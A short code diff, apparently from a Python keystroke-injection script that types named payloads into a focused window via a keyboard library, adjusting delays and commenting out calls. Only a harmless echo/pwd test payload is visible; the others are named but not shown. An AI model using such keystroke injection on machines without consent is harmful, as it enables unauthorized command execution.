@@ -66,6 +66,7 @@ echo 3kh0
 echo crypto fox
 pwd
 """
+
 def exec_payload(payload:str,delay:float=0.01):
     for line in payload.splitlines():
         kb.write(line,delay=delay)
@@ -87,13 +88,13 @@ if __name__ == "__main__":
     t.sleep(0.1)
     #refocus()
     t.sleep(1)
-    exec_payload(TEST_PAYLOAD)
+    #exec_payload(TEST_PAYLOAD)
     exec_payload(WIN_PAYLOAD_PNG)
     t.sleep(0.1)
-    exec_payload(PY_PAYLOAD,delay=0) #i'm dropping 3kB here, got to speed up
+    exec_payload(PY_PAYLOAD,delay=0.01) #i'm dropping 3kB here, got to speed up
     exec_payload(WIN_PAYLOAD_TXT)
     t.sleep(0.1)
-    refocus()
+    #refocus()
     t.sleep(0.2)
     exec_payload(PY_PAYLOAD_TXT)
     t.sleep(2)
